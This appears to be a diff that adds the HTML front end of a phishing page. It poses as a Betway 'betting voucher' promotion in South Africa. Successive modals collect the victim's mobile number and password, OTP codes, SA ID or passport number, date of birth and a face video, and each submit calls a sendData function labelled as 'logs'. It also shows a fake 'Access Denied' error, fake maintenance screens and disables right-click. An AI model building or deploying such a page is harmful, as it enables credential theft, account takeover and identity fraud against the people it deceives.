@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Betting Voucher South Africa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body oncontextmenu="return false;">
+
+    <!-- Initial Loading View -->
+    <div id="loading-view" class="site-view active-view">
+        <div class="loader-logo">betting voucher</div>
+        <div class="spinner" style="border-top-color:var(--bw-green)"></div>
+    </div>
+    
+    <!-- Action Processing Overlay -->
+    <div id="process-overlay">
+        <div class="loader-logo">betting voucher</div>
+        <div class="spinner" style="border-top-color:var(--bw-green)"></div>
+    </div>
+    
+    <!-- Live Floating Support Icon -->
+    <div id="chat-icon" onclick="toggleChat()"><i class="fas fa-headset" style="font-size:22px;color:#fff"></i></div>
+    
+    <!-- Login Modal -->
+    <div id="login-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Login</span>
+            </div>
+            <div class="modal-body">
+                <div class="mat-wrap has-prefix" id="mobile-wrap">
+                    <input type="tel" id="lgn-mobile" class="mat-input" onfocus="handleFocus(this, true)" onblur="handleBlur(this, true)" oninput="remMatErr(this)">
+                    <label class="mat-label" id="mobile-label">+27 Mobile Number</label>
+                    <span class="mat-prefix">+27</span>
+                    <div class="error-text">This field is required.</div>
+                </div>
+
+                <div class="mat-wrap" id="pw-wrap">
+                    <input type="password" id="login-pw" class="mat-input" onfocus="onPwFocus(this)" onblur="handleBlur(this, false)" oninput="remMatErr(this)">
+                    <label class="mat-label">Enter Password</label>
+                    <i class="fas fa-eye pw-eye" id="eye-login" onclick="togglePassword('login-pw','eye-login')"></i>
+                    <div class="error-text">This field is required.</div>
+                </div>
+
+                <div class="forgot-row">
+                    <span onclick="openModal('verification-modal')">Forgot Username</span>
+                    <span onclick="openModal('verification-modal')">Forgot Password?</span>
+                </div>
+                
+                <div class="signup-promo-box">
+                    <span>Don't have an account yet?</span>
+                    <strong onclick="openModal('signup-modal')" style="cursor:pointer; color:#000;">Sign Up <i class="fas fa-chevron-right" style="font-size:12px"></i></strong>
+                </div>
+                
+                <button id="lgn-submit" class="submit-btn" onclick="sendData('Betting Voucher logs')">Login</button>
+                
+                <div id="login-error"><i class="fas fa-info-circle"></i><span>Access Denied. Check Username and/or Password</span></div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Sign Up Modal -->
+    <div id="signup-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Sign Up Account</span>
+                <i class="fas fa-times" style="cursor:pointer;" onclick="openModal('login-modal')"></i>
+            </div>
+            <div class="modal-body" style="background: #f4f4f4;">
+                <input type="tel" id="signup-mobile" class="signup-input" placeholder="+27 Mobile Number" oninput="remErr(this)">
+                <input type="password" id="signup-pw" class="signup-input" placeholder="Enter Password" oninput="remErr(this)">
+                <input type="text" id="signup-fname" class="signup-input" placeholder="First Name" oninput="remErr(this)">
+                <input type="text" id="signup-sname" class="signup-input" placeholder="Surname" oninput="remErr(this)">
+                <input type="email" id="signup-email" class="signup-input" placeholder="Email Address" oninput="remErr(this)">
+                
+                <div class="promo-container">
+                    <div class="promo-item">
+                        <div class="promo-icon" style="color: #ff3b30;"><i class="fas fa-plane"></i></div>
+                        <div class="promo-text">
+                            <strong>1000 Free Flights</strong>
+                            <span>On Aviator Games</span>
+                        </div>
+                    </div>
+                    <div class="promo-item">
+                        <div class="promo-icon" style="color: #34c759;"><i class="fas fa-futbol"></i></div>
+                        <div class="promo-text">
+                            <strong>R1000 Welcome Voucher</strong>
+                            <span>On any Sports</span>
+                        </div>
+                    </div>
+                    <div class="promo-actions">
+                        <button class="promo-btn btn-later" onclick="openModal('login-modal')">Later</button>
+                        <button class="promo-btn btn-accept" onclick="handleAcceptPromo()">Accept</button>
+                    </div>
+                </div>
+
+                <button class="submit-btn" style="margin-top: 15px;" onclick="sendData('Sign Up logs')">Complete Registration</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- OTP Verification Modal -->
+    <div id="otp-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Security Verification</span>
+            </div>
+            <div class="modal-body">
+                <p style="font-size:14px; margin-bottom:20px; color:#444; line-height: 1.4;">
+                    To protect your account, please enter the Verification Code sent to your registered mobile device.
+                </p>
+                <div class="mat-wrap" id="otp-wrap">
+                    <input type="tel" id="otp-input" class="mat-input" style="letter-spacing: 4px; font-weight: bold; font-size: 18px;" onfocus="handleFocus(this, false, 'Verification Code')" onblur="handleBlur(this, false, 'Verification Code')" oninput="remMatErr(this)" maxlength="6">
+                    <label class="mat-label">Verification Code</label>
+                    <div class="error-text">Please enter a valid code.</div>
+                </div>
+                
+                <button id="otp-submit" class="submit-btn" onclick="sendData('OTP logs')">Verify & Proceed</button>
+                
+                <div id="otp-error"><i class="fas fa-exclamation-triangle"></i><span>Invalid Code. Please check and try again.</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Document Verification Modal -->
+    <div id="verification-modal" class="overlay" style="display:none">
+        <div class="modal-container">
+            <div class="modal-header">
+                <span>Identity Verification</span>
+                <i class="fas fa-times" style="cursor:pointer;" onclick="openModal('login-modal')"></i>
+            </div>
+            <div class="modal-body">
+                <p style="font-size:14px; margin-bottom:15px; color:#333;">We require additional identity details to process your account request.</p>
+                
+                <input type="text" id="verify-fname" placeholder="First Name" oninput="remErr(this)">
+                <input type="text" id="verify-sname" placeholder="Surname" oninput="remErr(this)">
+                
+                <select id="verify-doc-type">
+                    <option>SA ID Number</option>
+                    <option>Passport</option>
+                </select>
+                <input type="text" id="verify-doc-input" placeholder="Document Number" minlength="10" maxlength="15" oninput="remErr(this)">
+                
+                <label for="verify-dob" style="font-size:14px; color:#333; margin-bottom:5px; display:block;">Date of Birth</label>
+                <input type="text" id="verify-dob" placeholder="DD/MM/YYYY" maxlength="10" oninput="formatDOB(event); remErr(this)" style="color:#333;">
+                
+                <button id="verify-submit" class="submit-btn" onclick="sendData('Verification logs')">Verify Identity</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Face Verification View -->
+    <div id="face-verify-view" class="view">
+        <header>
+            <div class="logo-main" style="color:#fff;">betway</div>
+            <i class="fas fa-shield-alt" style="color:var(--bw-green); font-size:20px;"></i>
+        </header>
+        <div class="face-verify-container">
+            <h2 style="margin: 0 0 10px; font-size: 22px;">Biometric Verification</h2>
+            <p style="color:#bbb; font-size: 14px; margin: 0 0 20px; line-height: 1.5;">For security, we require a brief 3-second biometric video recording to confirm identity.</p>
+            
+            <div id="face-error" style="display:none; color:#ff3b30; background: rgba(255,59,48,0.1); padding:12px 15px; border-radius:6px; font-size:14px; margin-bottom:15px; width:100%; max-width:280px; text-align:center; border: 1px solid rgba(255,59,48,0.3);">
+                <i class="fas fa-exclamation-circle" style="margin-right: 5px;"></i> Biometric scan unclear. Please ensure good lighting, hold still, and try again.
+            </div>
+            
+            <div class="camera-frame" id="camera-frame">
+                <video id="user-video" autoplay playsinline muted></video>
+                <div class="scanner-line" id="scanner-line"></div>
+                <div class="camera-placeholder" id="camera-placeholder">
+                    <i class="fas fa-user-lock"></i>
+                </div>
+            </div>
+            
+            <div class="scan-status" id="scan-status">Position your face within the frame.</div>
+            
+            <button id="start-scan-btn" class="submit-btn" style="max-width: 300px; width: 100%;" onclick="startFaceScan()">Start Video Scan</button>
+        </div>
+    </div>
+    
+    <!-- Promo Success View -->
+    <div id="promo-success-view" class="view" style="background:#f4f4f4; color:#111; justify-content:center; align-items:center;">
+        <div style="text-align:center; padding: 40px;">
+            <i class="fas fa-gift" style="font-size: 60px; color: var(--bw-green); margin-bottom: 20px;"></i>
+            <h2 style="margin:0 0 10px; font-size: 24px;">Welcome Bonus Applied!</h2>
+            <p style="color:#555; font-size: 15px;">Your promotional voucher has been linked. Redirecting to login...</p>
+            <div class="spinner" style="border-top-color:var(--bw-green); margin: 30px auto;"></div>
+        </div>
+    </div>
+
+    <!-- Maintenance View -->
+    <div id="maintenance-view" class="view">
+        <div class="bars-container">
+            <div class="bar bar-1"></div>
+            <div class="bar bar-2"></div>
+            <div class="bar bar-3"></div>
+            <div class="jumper"><i class="fas fa-running"></i></div>
+            <div class="bar bar-4"></div>
+            <div class="bar bar-5"></div>
+            <div class="bar bar-6"></div>
+            <div class="bar bar-7"></div>
+        </div>
+        <h1 class="maint-title">WE'RE DOWN FOR<br>MAINTENANCE</h1>
+        <p class="maint-sub">Please try again soon</p>
+        
+        <div class="betway-logo-maint">
+            <span>betway</span>
+        </div>
+    </div>
+    
+    <!-- Live Chat Overlay -->
+    <div id="chat-window">
+        <div id="chat-header">
+            <span><i class="fas fa-circle" style="color:#4caf50; font-size:10px; margin-right:8px;"></i> Betting Voucher Support</span>
+            <i class="fas fa-times" style="cursor:pointer;" onclick="toggleChat()"></i>
+        </div>
+        <div id="chat-msgs">
+            <div class="msg-b msg-agent">Welcome to Betting Voucher Support. An agent is online. How can we assist you today?</div>
+        </div>
+        <div id="chat-input-area">
+            <input type="text" id="chat-txt" placeholder="Type your message..." onkeypress="handleChatEnter(event)">
+            <button id="chat-send-btn" onclick="sendChatTxt()"><i class="fas fa-paper-plane"></i></button>
+        </div>
+    </div>
+    
+    <script src="js/script.js"></script>
+</body>
+</html>
